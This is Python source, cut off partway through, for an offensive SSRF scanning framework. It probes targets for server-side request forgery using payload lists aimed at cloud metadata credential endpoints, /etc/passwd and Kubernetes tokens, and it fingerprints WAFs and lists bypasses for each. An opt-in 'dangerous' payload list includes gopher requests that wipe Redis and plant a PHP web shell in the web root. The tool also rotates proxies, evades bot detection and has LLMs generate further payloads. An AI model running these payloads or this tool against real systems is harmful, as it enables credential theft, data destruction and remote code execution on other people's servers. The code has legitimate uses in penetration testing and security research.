#!/usr/bin/env python3

import asyncio, json, random, re, urllib.parse, os, sys, socket, argparse, time
from dataclasses import dataclass, asdict
from datetime import datetime
from typing import List, Dict, Optional, Set, Tuple
from collections import defaultdict
from pathlib import Path
from playwright.async_api import async_playwright, Response, Page

try:
    import aiohttp
    AIOHTTP_AVAILABLE = True
except ImportError:
    AIOHTTP_AVAILABLE = False

try:
    from jinja2 import Template
    JINJA2_AVAILABLE = True
except ImportError:
    JINJA2_AVAILABLE = False

try:
    import yaml
    YAML_AVAILABLE = True
except ImportError:
    YAML_AVAILABLE = False

try:
    import networkx as nx
    NETWORKX_AVAILABLE = True
except ImportError:
    NETWORKX_AVAILABLE = False


RED = "\033[91m"; GREEN = "\033[92m"; YELLOW = "\033[93m"; BLUE = "\033[94m"
MAGENTA = "\033[95m"; CYAN = "\033[96m"; PURPLE = "\033[35m"; BOLD = "\033[1m"; DIM = "\033[2m"
RESET = "\033[0m"; OK = f"{GREEN}[OK]{RESET}"; WARN = f"{YELLOW}[!]{RESET}"; FAIL = f"{RED}[X]{RESET}"
AI_ICON = f"{PURPLE}[AI]{RESET}"

BANNER = f"""
{BOLD}{CYAN}
╔════════════════════════════════════════════════════════════════╗
║         ULTIMATE SSRF FRAMEWORK v5.0 – WAF-Aware Edition      ║
║    github.com/KauanCosta2000/Ultimate-ssrf-Framework          ║
║             Created by belladonnask                            ║
╚════════════════════════════════════════════════════════════════╝
{RESET}"""


DEFAULT_SSRF_PAYLOADS = [

    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/user-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name",
    "http://169.254.169.254/latest/meta-data/public-keys/",
    "http://169.254.169.254/latest/dynamic/instance-identity/document",
    "http://169.254.169.254/latest/meta-data/services/domain",
    "http://169.254.169.254/latest/meta-data/network/interfaces/macs/",

    "http://[::ffff:169.254.169.254]/latest/meta-data/",
    "http://2852039166/latest/meta-data/",
    "http://0254.0254.0169.0254/latest/meta-data/",
    "http://0xa9fea9fe/latest/meta-data/",

    "http://169.254.169.254.nip.io/latest/meta-data/",
    "http://169.254.169.254.xip.io/latest/meta-data/",
    "http://metadata.nicob.net/latest/meta-data/",

    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",

    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://169.254.169.254/metadata/identity/oauth2/token?resource=https://vault.azure.net",

    "http://100.100.100.200/latest/meta-data/",

    "http://169.254.169.254/opc/v2/instance/",

    "http://metadata.tencentyun.com/latest/meta-data/",

    "http://kubernetes.default.svc/api/v1/namespaces",
    "http://kubernetes.default.svc/apis/apps/v1/deployments",
    "https://kubernetes.default.svc/metrics",

    "http://127.0.0.1/",
    "http://localhost/",
    "http://0.0.0.0/",
    "http://[::1]/",
    "http://0/",
    "http://127.0.0.1.sslip.io/",
    "http://localtest.me/",
    "http://1.0.0.127.nip.io/",

    "gopher://127.0.0.1:6379/_INFO",
    "dict://127.0.0.1:6379/info",
    "ftp://127.0.0.1:21/",
    "ldap://127.0.0.1:389/",

    "file:///etc/passwd",
    "file:///var/run/secrets/kubernetes.io/serviceaccount/token",

    "http://127.0.0.1/%0d%0aX-Injected%3A%20true",
    "http://your-collaborator.com/redirect?url=http://169.254.169.254/",
]

DANGEROUS_SSRF_PAYLOADS = [
    "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a",
    "gopher://127.0.0.1:6379/_config%20set%20dir%20/var/www/html%0d%0aconfig%20set%20dbfilename%20cmd.php%0d%0aset%20payload%20%22%3C%3Fphp%20system($_GET['cmd'])%3B%3F%3E%22%0d%0asave%0d%0a",
]


@dataclass
class SSRFEvidence:
    phase: str; technique: str; url: str; endpoint: str; param: str
    payload: str; status: int; body_snippet: str; matched_patterns: List[str]
    severity: str = "info"; request_headers: Optional[Dict] = None
    response_headers: Optional[Dict] = None; out_of_band_hit: bool = False
    impact_score: float = 0.0

@dataclass
class DiscoveredEndpoint:
    path: str; method: str; params: Set[str]
    accepts_url_param: bool; test_response_code: int; content_type: str

@dataclass
class ScanAttempt:
    phase: str; technique: str; target: str; tested_url: str; endpoint: str
    param: str; payload: str; status: int; vulnerable: bool = False
    result: str = "not_confirmed"; severity: str = "info"; confidence: str = "low"
    matched_patterns: Optional[List[str]] = None; error: Optional[str] = None


def setup_argparse():
    parser = argparse.ArgumentParser(description="Ultimate SSRF Framework v5.0",
                                     formatter_class=argparse.RawDescriptionHelpFormatter)
    target_group = parser.add_mutually_exclusive_group()
    target_group.add_argument("--target", "-t")
    target_group.add_argument("--targets")
    target_group.add_argument("--target-file", "-f")
    parser.add_argument("--param", help="Specific parameter to test on a single target. Only supported with --target.")
    parser.add_argument("--callback", "-c")
    parser.add_argument("--collaborator")
    parser.add_argument("--burp-collaborator")
    parser.add_argument("--delay", "-d", type=float, default=0.3)
    parser.add_argument("--quiet", "-q", action="store_true")
    parser.add_argument("--visible", action="store_true")
    proxy_group = parser.add_argument_group("Proxy")
    proxy_group.add_argument("--proxy", "-p")
    proxy_group.add_argument("--proxy-file")
    proxy_group.add_argument("--proxy-type", choices=["http","socks5"], default="http")
    ai_group = parser.add_argument_group("AI")
    ai_group.add_argument("--ai-provider", choices=["claude","openai","ollama","gemini","mistral","deepseek","sheep","none"])
    ai_group.add_argument("--ai-key")
    ai_group.add_argument("--ai-model")
    feature_group = parser.add_argument_group("Features")
    feature_group.add_argument("--no-waf", action="store_true")
    feature_group.add_argument("--no-websocket", action="store_true")
    feature_group.add_argument("--no-grpc", action="store_true")
    feature_group.add_argument("--no-k8s", action="store_true")
    feature_group.add_argument("--no-serverless", action="store_true")
    feature_group.add_argument("--no-graphql", action="store_true")
    feature_group.add_argument("--no-api-schema", action="store_true")
    feature_group.add_argument("--no-mesh", action="store_true")
    feature_group.add_argument("--no-bot-evasion", action="store_true")
    feature_group.add_argument("--no-ai", action="store_true")
    feature_group.add_argument("--dangerous-payloads", action="store_true")
    export_group = parser.add_argument_group("Export")
    export_group.add_argument("--export-nuclei", action="store_true")
    export_group.add_argument("--export-siem", action="store_true")
    export_group.add_argument("--export-json-api", action="store_true")
    export_group.add_argument("--attack-map", action="store_true")
    export_group.add_argument("--output", "-o", default=".")
    return parser


class TargetManager:
    @staticmethod
    def from_args(args):
        if args.target:
            c = TargetManager._clean(args.target)
            return [c] if c else []
        if args.targets:
            return [d for d in (TargetManager._clean(x) for x in args.targets.split(',')) if d]
        if args.target_file:
            return TargetManager._from_file(args.target_file)
        return []

    @staticmethod
    def _clean(domain):
        d = domain.strip()
        if not d: return None
        d = re.sub(r'^https?://', '', d).split('/')[0]
        return d

    @staticmethod
    def _from_file(path):
        targets = []
        with open(path) as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    c = TargetManager._clean(line)
                    if c: targets.append(c)
        return targets

class ProxyManager:
    def __init__(self, proxy_list=None, proxy_type="http"):
        self.list = proxy_list or []
        self.ptype = proxy_type
        self.idx = 0
        self.lock = asyncio.Lock()

    @classmethod
    def from_file(cls, path, ptype="http"):
        proxies = []
        with open(path) as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    proxies.append(line)
        return cls(proxies, ptype)

    async def pick(self):
        if not self.list: return None
        async with self.lock:
            p = self.list[self.idx % len(self.list)]
            self.idx += 1
            return p


SHEEP_BASE_URL = "https://sheep.byfranke.com"
SHEEP_MAX_ATTEMPTS = 3
SHEEP_TIMEOUT = 45
SHEEP_MODELS = {"auto", "scout", "hunter", "sage"}

def redact_secret(value: str) -> str:
    if not value: return value
    return re.sub(r'shp_[A-Za-z0-9_=-]+', 'shp_[REDACTED]', str(value))

class SheepAPIError(Exception): pass

class LLMClient:
    MODELS = {
        "claude": "claude-3-5-sonnet-20241022",
        "openai": "gpt-4o",
        "ollama": "llama3.1:latest",
        "gemini": "gemini-2.0-flash-exp",
        "mistral": "mistral-large-latest",
        "deepseek": "deepseek-chat",
        "sheep": "auto",
    }

    def __init__(self, provider=None, api_key=None, model=None):
        self.provider = provider
        self.api_key = api_key
        self.model = model or self.MODELS.get(provider)
        self.enabled = False
        self.last_usage = {}
        self.last_error = None

        if not provider or provider == "none" or not AIOHTTP_AVAILABLE:
            return

        if provider == "sheep":
            self.api_key = api_key or os.environ.get("SHEEP_TOKEN") or os.environ.get("SHEEP_API_TOKEN")
            self.model = self.model if self.model in SHEEP_MODELS else "auto"
            if self.api_key:
                self.enabled = True
            else:
                print(f"{WARN} Sheep API token missing.")
            return

        if provider == "ollama":
            try:
                s = socket.socket()
                s.settimeout(1)
                s.connect(("localhost", 11434))
                s.close()
                self.enabled = True
            except Exception:
                print(f"{WARN} Ollama not reachable")
            return

        if api_key:
            self.enabled = True
        else:
            print(f"{WARN} No API key for {provider}")

    async def generate(self, sys_msg, usr_msg):
        if not self.enabled: return None
        try:
            if self.provider == "claude":
                return await self._claude(sys_msg, usr_msg)
            if self.provider == "gemini":
                return await self._gemini(sys_msg, usr_msg)
            if self.provider == "ollama":
                return await self._ollama(sys_msg, usr_msg)
            if self.provider == "sheep":
                return await self._sheep(sys_msg, usr_msg)
            return await self._openai_compat(sys_msg, usr_msg)
        except Exception as e:
            self.last_error = redact_secret(str(e))
            print(f"{WARN} LLM error: {self.last_error}")
            return None

    async def _claude(self, sys_msg, usr_msg):
        headers = {"x-api-key": self.api_key, "anthropic-version": "2023-06-01", "content-type": "application/json"}
        body = {"model": self.model, "max_tokens": 4096, "system": sys_msg, "messages": [{"role":"user","content":usr_msg}]}
        async with aiohttp.ClientSession() as s:
            async with s.post("https://api.anthropic.com/v1/messages", headers=headers, json=body, timeout=60) as r:
                data = await r.json()
                return data.get("content",[{}])[0].get("text","")

    async def _openai_compat(self, sys_msg, usr_msg):
        urls = {"openai":"https://api.openai.com/v1/chat/completions",
                "mistral":"https://api.mistral.ai/v1/chat/completions",
                "deepseek":"https://api.deepseek.com/v1/chat/completions"}
        headers = {"Authorization": f"Bearer {self.api_key}", "Content-Type": "application/json"}
        body = {"model": self.model, "messages": [{"role":"system","content":sys_msg},{"role":"user","content":usr_msg}], "max_tokens":4096}
        url = urls.get(self.provider, urls["openai"])
        async with aiohttp.ClientSession() as s:
            async with s.post(url, headers=headers, json=body, timeout=60) as r:
                data = await r.json()
                return data.get("choices",[{}])[0].get("message",{}).get("content","")

    async def _gemini(self, sys_msg, usr_msg):
        url = f"https://generativelanguage.googleapis.com/v1beta/models/{self.model}:generateContent?key={self.api_key}"
        body = {"contents":[{"parts":[{"text":f"{sys_msg}\n\n{usr_msg}"}]}]}
        async with aiohttp.ClientSession() as s:
            async with s.post(url, json=body, timeout=60) as r:
                data = await r.json()
                return data.get("candidates",[{}])[0].get("content",{}).get("parts",[{}])[0].get("text","")

    async def _ollama(self, sys_msg, usr_msg):
        body = {"model": self.model, "prompt": f"System: {sys_msg}\n\nUser: {usr_msg}\n\nAssistant:", "stream": False}
        async with aiohttp.ClientSession() as s:
            async with s.post("http://localhost:11434/api/generate", json=body, timeout=120) as r:
                data = await r.json()
                return data.get("response","")

    async def _sheep(self, sys_msg, usr_msg):
        model = self.model if self.model in SHEEP_MODELS else "auto"
        payload = {"question": f"{sys_msg}\n\n{usr_msg}", "model": model}
        headers = {"X-Sheep-Token": self.api_key, "Content-Type": "application/json",
                   "User-Agent": "ultimate-ssrf-framework/5.0"}
        timeout = aiohttp.ClientTimeout(total=SHEEP_TIMEOUT)

        for attempt in range(SHEEP_MAX_ATTEMPTS):
            try:
                async with aiohttp.ClientSession(timeout=timeout) as session:
                    async with session.post(f"{SHEEP_BASE_URL}/api/ai/ask", headers=headers, json=payload) as response:
                        try: data = await response.json()
                        except: data = {"text": await response.text()}
                        if response.status == 200:
                            self.last_error = None
                            self.last_usage = {"provider":"sheep","model_requested":model,
                                               "served_by":data.get("served_by"),
                                               "tokens_used":data.get("tokens_used")}
                            for key in ("response","answer","content","text","result","message"):
                                val = data.get(key)
                                if isinstance(val, str) and val.strip():
                                    return val
                            return json.dumps(data, ensure_ascii=False)
                        if response.status == 429:
                            retry_after = response.headers.get("Retry-After","10")
                            try: wait_time = int(retry_after)
                            except: wait_time = 10
                            if attempt < SHEEP_MAX_ATTEMPTS-1:
                                print(f"{WARN} Sheep rate limited. Retrying in {wait_time}s")
                                await asyncio.sleep(wait_time)
                                continue
                        if 500 <= response.status < 600:
                            wait = 2**attempt
                            if attempt < SHEEP_MAX_ATTEMPTS-1:
                                print(f"{WARN} Sheep temporary error {response.status}. Retrying in {wait}s")
                                await asyncio.sleep(wait)
                                continue
                        raise SheepAPIError(f"Sheep API error {response.status}: {data.get('detail','')}")
            except (aiohttp.ClientError, asyncio.TimeoutError) as e:
                wait = 2**attempt
                if attempt < SHEEP_MAX_ATTEMPTS-1:
                    print(f"{WARN} Sheep connection error. Retrying in {wait}s")
                    await asyncio.sleep(wait)
                    continue
                raise SheepAPIError(f"Sheep request failed: {redact_secret(str(e))}")
        raise SheepAPIError("Sheep request failed after retries")

class AISkills:
    def __init__(self, llm, dangerous_payloads=False):
        self.llm = llm
        self.enabled = llm and llm.enabled
        self.dangerous = dangerous_payloads
        self.last_llm_payloads = []

    async def generate_payloads(self, context: dict) -> List[str]:
        sys = (
            "You are helping an authorized security testing tool generate SSRF test payloads. "
            "Return only a JSON array of strings. "
            "Generate safe, non-destructive SSRF payloads focused on detection and validation. "
            "Prefer callback/OAST, cloud metadata read-only probes, localhost variants, URL parser bypasses, "
            "DNS helper domains, redirects, encoded URL forms, IPv6/decimal/octal forms, and scheme confusion checks. "
            "Do not include explanations. Return JSON only."
        )
        usr = (
            f"Target: {context.get('target')}\n"
            f"WAF: {context.get('waf', 'none')}\n"
            f"Cloud: {context.get('cloud', 'unknown')}\n"
            f"Callback host: {context.get('callback_host', '')}\n"
            f"Endpoints: {json.dumps(context.get('endpoints', []), ensure_ascii=False)}\n"
            f"Parameters: {json.dumps(context.get('params', []), ensure_ascii=False)}\n"
            "Generate 10 safe SSRF payloads."
        )
        resp = await self.llm.generate(sys, usr)
        llm_payloads = []

        if resp:
            try:
                match = re.search(r'\[.*\]', resp, re.DOTALL)
                if match:
                    parsed = json.loads(match.group())
                    if isinstance(parsed, list):
                        llm_payloads = [str(item).strip() for item in parsed if str(item).strip()]
            except Exception: pass

        self.last_llm_payloads = llm_payloads
        combined = DEFAULT_SSRF_PAYLOADS.copy()
        if self.dangerous:
            combined.extend(DANGEROUS_SSRF_PAYLOADS)
        for payload in llm_payloads:
            if payload not in combined:
                combined.append(payload)
        return combined[:40]

    async def suggest_additional_tests(self, context: dict) -> List[dict]:
        sys = (
            "You are assisting an authorized web security scanner. "
            "Suggest safe, non-destructive validation checks based on discovered endpoints and parameters. "
            "Return only a JSON array of objects. "
            "Allowed issue_type values: ssrf, open_redirect, cors_misconfig, header_injection, "
            "path_traversal_readonly, information_disclosure, authz_review. "
            "Do not suggest destructive tests. "
            "Each object must contain: issue_type, endpoint, param, reason, safe_test_value."
        )
        usr = json.dumps({
            "target": context.get("target"),
            "callback_host": context.get("callback_host"),
            "endpoints": context.get("endpoints", []),
            "params": context.get("params", []),
            "waf": context.get("waf"),
            "cloud": context.get("cloud"),
        }, indent=2, ensure_ascii=False)
        resp = await self.llm.generate(sys, usr)
        if not resp: return []
        try:
            match = re.search(r'\[.*\]', resp, re.DOTALL)
            if not match: return []
            parsed = json.loads(match.group())
            if not isinstance(parsed, list): return []
            allowed = {"ssrf","open_redirect","cors_misconfig","header_injection","path_traversal_readonly","information_disclosure","authz_review"}
            suggestions = []
            for item in parsed[:15]:
                if not isinstance(item, dict): continue
                issue_type = str(item.get("issue_type","")).strip().lower()
                endpoint = str(item.get("endpoint","")).strip()
                param = str(item.get("param","")).strip()
                reason = str(item.get("reason","")).strip()
                safe_test_value = str(item.get("safe_test_value","")).strip()
                if issue_type not in allowed or not endpoint.startswith("/") or not param:
                    continue
                suggestions.append({
                    "issue_type": issue_type, "endpoint": endpoint, "param": param,
                    "reason": reason, "safe_test_value": safe_test_value
                })
            return suggestions
        except Exception: return []

    async def triage(self, findings: List[dict]) -> Optional[str]:
        sys = (
            "You are a senior security analyst reviewing authorized web security scan results. "
            "Separate confirmed vulnerable items, suspected_other_issue items, manual_review items, not_confirmed attempts and errors. "
            "For confirmed SSRF issues, mention endpoint, parameter, payload, evidence, severity and recommended next steps. "
            "Never claim a target is safe when the result is only not_confirmed."
        )
        usr = json.dumps(findings[:40], indent=2, ensure_ascii=False)
        return await self.llm.generate(sys, usr)


class WAFFingerprinter:
    SIGNATURES = {
        "Cloudflare": {"headers":["cf-ray","__cfduid"],"cookies":["__cfduid","cf_clearance"],"body":["cloudflare"]},
        "AWS WAF": {"headers":["x-amz-cf-id","x-amzn-requestid"],"cookies":[],"body":["request blocked"]},
        "Akamai": {"headers":["x-akamai-transformed","x-akamai-request-id"],"cookies":["ak_bmsc"],"body":["akamai"]},
        "Fastly": {"headers":["fastly-debug-digest","x-served-by","x-cache"],"cookies":[],"body":["fastly"]},
        "Imperva": {"headers":["x-cdn","x-iinfo"],"cookies":["incap_ses_","visid_incap_"],"body":["incapsula"]},
        "F5 BIG-IP": {"headers":["x-wa-info","x-cnection"],"cookies":["f5avr","BIGipServer"],"body":["f5 networks"]},
        "Azure Front Door / WAF": {"headers":["x-azure-ref","x-ms-request-id"],"cookies":[],"body":["azure"]},
        "Google Cloud Armor": {"headers":["x-goog-"],"cookies":[],"body":["google cloud armor"]},
        "Sucuri": {"headers":["x-sucuri-id","x-sucuri-cache"],"cookies":["sucuri_cloudproxy_uuid"],"body":["sucuri"]},
        "Barracuda WAF": {"headers":["x-barracuda","x-bc-true-ip"],"cookies":["barra_counter_session"],"body":["barracuda"]},
        "Fortinet FortiWeb": {"headers":["x-fortiweb"],"cookies":["fortiwafsid"],"body":["fortiweb"]},
        "Radware AppWall": {"headers":["x-radware"],"cookies":["CloudProxy"],"body":["radware"]},
        "Citrix NetScaler / ADC WAF": {"headers":["x-citrix","x-ns-"],"cookies":["nsenc", "citrix_ns_id"],"body":[]},
        "Wallarm": {"headers":["x-wallarm"],"cookies":[],"body":["wallarm"]},
        "DataDome": {"headers":["x-datadome"],"cookies":["datadome"],"body":[]},
        "HUMAN / PerimeterX": {"headers":["x-px"],"cookies":["_px","px_captcha"],"body":["perimeterx"]},
        "Kong API Gateway (security plugins)": {"headers":["x-kong-proxy-latency","x-kong-upstream-latency"],"cookies":[],"body":[]},
        "Apigee": {"headers":["apigee"],"cookies":[],"body":["apigee"]},
        "ModSecurity / OWASP CRS": {"headers":["x-modsecurity"],"cookies":[],"body":["modsecurity","owasp"]},
    }

    BYPASS = {
        "Cloudflare": ["DNS rebinding", "IPv6 notation", "Origin IP discovery", "HTTP/2 smuggle"],
        "AWS WAF": ["IMDSv1 downgrade", "Alternative metadata IPs", "Decimal/octal IP", "Host header override"],
        "Akamai": ["Origin IP leak", "DNS pinning", "Double URL encoding", "Padding with ."],
        "Fastly": ["Spoof Host header", "Alternate DNS A record", "CRLF injection"],
        "Imperva": ["Double URL encoding", "gopher:// protocol", "Hex encoding of IP"],
        "F5 BIG-IP": ["HTTP request smuggling", "Header CRLF", "Path normalization bypass"],
        "Azure WAF": ["Request size evasion", "Unicode normalization", "Alternative metadata endpoints"],
        "Google Cloud Armor": ["Header size limit exploit", "HTTP/2 cleartext", "Multiple Host headers"],
        "ModSecurity / OWASP CRS": ["Encoding bypass (UTF-16, utf-7)", "Parameter pollution", "Long string mutation"],
        "Wallarm": ["AI-aware payload mutation", "Multiple parameters with same name", "Alternate JSON encoding"],
        "Sucuri": ["Direct origin access", "Cloudflare DNS bypass", "X-Forwarded-For spoofing"],
        "Barracuda": ["Request line folding", "Tab character injection", "HTTP/1.0 downgrade"],
        "Fortinet FortiWeb": ["Chunked encoding bypass", "Header name case switching", "Malformed POST"],
        "Radware": ["HTTP verb tampering", "HTTP/0.9 request", "Long Content-Length mismatch"],
        "Citrix ADC": ["URI smuggling", "Encoded backslash trick", "HTTP protocol version confusion"],
        "DataDome": ["Stealth Playwright (delay, human-like mouse)", "Rotate residential proxies", "Change TLS fingerprint"],
        "HUMAN / PerimeterX": ["Headless detection evasion", "Canvas fingerprint spoofing", "Spoof navigator properties"],
        "Kong / Apigee": ["Schema fuzzing", "JSON array/object injection", "Extra body parameters"],
    }

    def fingerprint(self, headers, body, cookies=None):
        cookies = cookies or {}
        headers_lower = {k.lower(): str(v).lower() for k,v in headers.items()}
        body_lower = body.lower()[:10000]
        cookie_keys = [k.lower() for k in cookies]
        results = {}
        for waf, sigs in self.SIGNATURES.items():
            score = 0; max_score = 0
            for h in sigs["headers"]:
                max_score += 2
                if any(h.lower() in hk for hk in headers_lower): score += 2
            for c in sigs["cookies"]:
                max_score += 2
                if any(c.lower() in ck for ck in cookie_keys): score += 2
            for b in sigs["body"]:
                max_score += 1
                if b in body_lower: score += 1
            if max_score > 0:
                confidence = (score/max_score)*100
                if confidence >= 20: results[waf] = confidence
        sorted_results = sorted(results.items(), key=lambda x: x[1], reverse=True)
        if sorted_results:
            return {"detected":True,"primary":sorted_results[0][0],"confidence":sorted_results[0][1],
                    "all_matches":dict(sorted_results[:3]),
                    "bypass_suggestions":self.BYPASS.get(sorted_results[0][0],[])}
        return {"detected":False,"primary":None,"confidence":0}


class UltimateSSRFFramework:
    def __init__(self, target, args):
        self.target = target
        self.base = f"https://{target}" if not target.startswith("http") else target
        self.cb = (args.callback or args.collaborator or args.burp_collaborator or f"{target}.ssrf-test.local")
        self.delay = args.delay
        self.verbose = not args.quiet
        self.headless = not args.visible
        self.user_param = getattr(args, "param", None)
        self.proxy = args.proxy
        self.proxy_file = args.proxy_file
        self.proxy_type = args.proxy_type
        self.no_waf = args.no_waf
        self.no_ws = args.no_websocket
        self.no_grpc = args.no_grpc
        self.no_k8s = args.no_k8s
        self.no_serverless = args.no_serverless
        self.no_graphql = args.no_graphql
        self.no_api_schema = args.no_api_schema
        self.no_mesh = args.no_mesh
        self.no_bot_evasion = args.no_bot_evasion
        self.no_ai = args.no_ai
        self.dangerous_payloads = args.dangerous_payloads
        self.do_export_nuclei = args.export_nuclei
        self.do_export_siem = args.export_siem
        self.do_export_json_api = args.export_json_api
        self.do_attack_map = args.attack_map

        self.output_dir = Path(args.output)
        self.output_dir.mkdir(parents=True, exist_ok=True)

        self.llm = None; self.ai = None
        if args.ai_provider and args.ai_provider != "none" and not self.no_ai:
            self.llm = LLMClient(args.ai_provider, args.ai_key, args.ai_model)
            if self.llm.enabled:
                self.ai = AISkills(self.llm, dangerous_payloads=args.dangerous_payloads)

        self.evidence: List[SSRFEvidence] = []
        self.scan_attempts: List[ScanAttempt] = []
        self.ai_suggestions = []
        self.other_issue_attempts = []
        self.endpoints: List[DiscoveredEndpoint] = []
        self.params: Set[str] = set()
        self.callbacks = defaultdict(list)
        self.callback_context = {}
        self.waf_info = {}
        self.cloud = []
        self.internal_ips = set()

        self.proxy_mgr = None
        if args.proxy_file:
            self.proxy_mgr = ProxyManager.from_file(args.proxy_file, args.proxy_type)
        elif args.proxy:
            self.proxy_mgr = ProxyManager([args.proxy], args.proxy_type)

        self.waf = WAFFingerprinter()
        self.playwright = None; self.browser = None; self.page = None
        self.sem = asyncio.Semaphore(15)

        safe = re.sub(r'[^a-zA-Z0-9.-]', '_', target)
        ts = datetime.now().strftime('%Y%m%d_%H%M%S')
        self.json_file = self.output_dir / f"ssrf_{safe}_{ts}.json"
        self.html_file = self.output_dir / f"ssrf_report_{safe}_{ts}.html"

    async def start(self):
        self.playwright = await async_playwright().start()
        launch_opts = {"headless": self.headless}
        if self.proxy_mgr:
            p = await self.proxy_mgr.pick()
            if p: launch_opts["proxy"] = {"server": p}
        self.browser = await self.playwright.chromium.launch(**launch_opts)
        ctx = await self.browser.new_context(user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        await ctx.route("**/*", self._intercept)
        self.page = await ctx.new_page()

    async def stop(self):
        if self.browser: await self.browser.close()
        if self.playwright: await self.playwright.stop()

    async def _intercept(self, route):
        req = route.request
        url = req.url
        try:
            parsed = urllib.parse.urlparse(url)
            req_host = (parsed.hostname or "").lower()
            cb_host = self._callback_host()
            if cb_host and req_host.endswith(cb_host):
                ctx = self._find_callback_context(req_host)
                ev = SSRFEvidence(
                    phase=ctx.get("phase","BLIND_SSRF"), technique=ctx.get("technique","OOB Callback"),
                    url=url, endpoint=ctx.get("endpoint","unknown"), param=ctx.get("param","callback"),
                    payload=ctx.get("payload", url), status=200, body_snippet="",
                    matched_patterns=["[CRITICAL] OOB callback host requested"], severity="critical",
                    out_of_band_hit=True
                )
                ev.impact_score = self._impact(ev)
                self.evidence.append(ev)
                self.scan_attempts.append(ScanAttempt(
                    phase=ev.phase, technique=ev.technique, target=self.target, tested_url=url,
                    endpoint=ev.endpoint, param=ev.param, payload=ev.payload, status=200,
                    vulnerable=True, result="vulnerable", severity=ev.severity, confidence="high",
                    matched_patterns=ev.matched_patterns
                ))
                self.callbacks[req_host].append({
                    "time": datetime.now().isoformat(), "method": req.method,
                    "url": url, "endpoint": ev.endpoint, "param": ev.param, "payload": ev.payload
                })
        except Exception: pass
        await route.continue_()

    async def request(self, method, url, data=None, headers=None, timeout=15000):
        async with self.sem:
            try:
                safe_url = json.dumps(url)
                if method.upper() == "GET":
                    resp = await self.page.goto(url, wait_until="domcontentloaded", timeout=timeout)
                    status = resp.status if resp else 0
                    body = await resp.text() if resp else ""
                    hdrs = dict(resp.headers) if resp else {}
                else:
                    js = f"""(async () => {{
                        const r = await fetch({safe_url}, {{
                            method: '{method}',
                            headers: {json.dumps(headers or {})},
                            body: {json.dumps(json.dumps(data) if data else "")}
                        }});
                        return {{ status: r.status, body: await r.text(), headers: Object.fromEntries(r.headers) }};
                    }})();"""
                    result = await self.page.evaluate(js)
                    status = result.get("status",0); body = result.get("body",""); hdrs = result.get("headers",{})
                await asyncio.sleep(self.delay)
                return status, body, hdrs
            except Exception as e:
                return 0, "", {"_error": str(e)}

    async def check_evidence(self, phase, technique, url, endpoint, param, payload, status, body, headers):
        patterns = [
            (r'root:[^:]+:[0-9]+:[0-9]+:', '/etc/passwd', 'critical'),
            (r'AKIA[0-9A-Z]{16}', 'AWS key', 'critical'),
            (r'computeMetadata|metadata\.google\.internal', 'Cloud metadata', 'high'),
            (r'169\.254\.\d{1,3}\.\d{1,3}', 'Cloud metadata IP', 'high'),
            (r'10\.\d{1,3}\.\d{1,3}\.\d{1,3}', 'Internal IP', 'high'),
            (r'192\.168\.\d{1,3}\.\d{1,3}', 'Internal IP', 'high'),
        ]
        matched = []
        combined = (body + json.dumps(headers)).lower()
        for pat, desc, sev in patterns:
            if re.search(pat, combined, re.I):
                matched.append(f"[{sev.upper()}] {desc}")
        if self.cb and self.cb in body:
            matched.append("[CRITICAL] Callback in response")
        if matched:
            sev_order = {"CRITICAL":0,"HIGH":1,"MEDIUM":2,"LOW":3}
            sev = min(sev_order.get(p.split("]")[0].replace("[",""),3) for p in matched)
            sev_map = {0:"critical",1:"high",2:"medium",3:"low"}
            ev = SSRFEvidence(phase=phase, technique=technique, url=url, endpoint=endpoint, param=param,
                              payload=payload, status=status, body_snippet=body[:300],
                              matched_patterns=matched, severity=sev_map.get(sev,"info"))
            ev.impact_score = self._impact(ev)
            self.evidence.append(ev)
            ips = re.findall(r'(10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(1[6-9]|2[0-9]|3[0-1])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})', body)
            for ip in ips: self.internal_ips.add(ip[0])
            return [ev]
        return []

    def _impact(self, ev):
        score = 0.0
        if ev.out_of_band_hit: score += 3
        if any("token" in p.lower() for p in ev.matched_patterns): score += 4
        elif any("metadata" in p.lower() for p in ev.matched_patterns): score += 2
        if re.search(r'(10\.|172\.(1[6-9]|2[0-9]|3[0-1])|192\.168\.)', ev.url): score += 3
        return min(score, 10.0)

    async def test_payload(self, ep, param, payload, phase, technique, extra_headers=None):
        if not isinstance(payload, str): payload = str(payload)
        payload = payload.strip()
        if not payload: return False

        if ep.method == "GET":
            sep = "&" if "?" in ep.path else "?"
            url = f"{self.base}{ep.path}{sep}{param}={urllib.parse.quote(payload)}"
            self._register_callback_context(payload, ep.path, param, phase, technique)
            status, body, headers = await self.request("GET", url, headers=extra_headers)
        else:
            url = f"{self.base}{ep.path}"
            self._register_callback_context(payload, ep.path, param, phase, technique)
            status, body, headers = await self.request("POST", url, {param: payload}, headers=extra_headers)

        findings = await self.check_evidence(phase, technique, url, ep.path, param, payload, status, body, headers)
        error = headers.get("_error") if isinstance(headers,dict) else None
        vulnerable = bool(findings)

        if vulnerable:
            best = findings[0]
            result = "vulnerable"; severity = best.severity
            confidence = "high" if best.out_of_band_hit else "medium"
            matched_patterns = best.matched_patterns
        elif error:
            result = "error"; severity = "info"; confidence = "low"; matched_patterns = []
        else:
            result = "not_confirmed"; severity = "info"; confidence = "low"; matched_patterns = []

        self.scan_attempts.append(ScanAttempt(
            phase=phase, technique=technique, target=self.target, tested_url=url,
            endpoint=ep.path, param=param, payload=payload, status=status,
            vulnerable=vulnerable, result=result, severity=severity, confidence=confidence,
            matched_patterns=matched_patterns, error=error
        ))
        return vulnerable

    async def discover(self):
        if self.verbose: print(f"\n{CYAN}[DISCOVERY]{RESET} Crawling...")
        static_paths = ["/","/api","/proxy","/fetch","/graphql","/health","/ws","/socket","/grpc","/k8s"]
        crawled_paths = set(static_paths)
        try:
            await self.page.goto(self.base, wait_until="networkidle", timeout=20000)
            extracted = await self.page.evaluate("""() => {
                const paths = new Set();
                document.querySelectorAll('a[href]').forEach(a => {
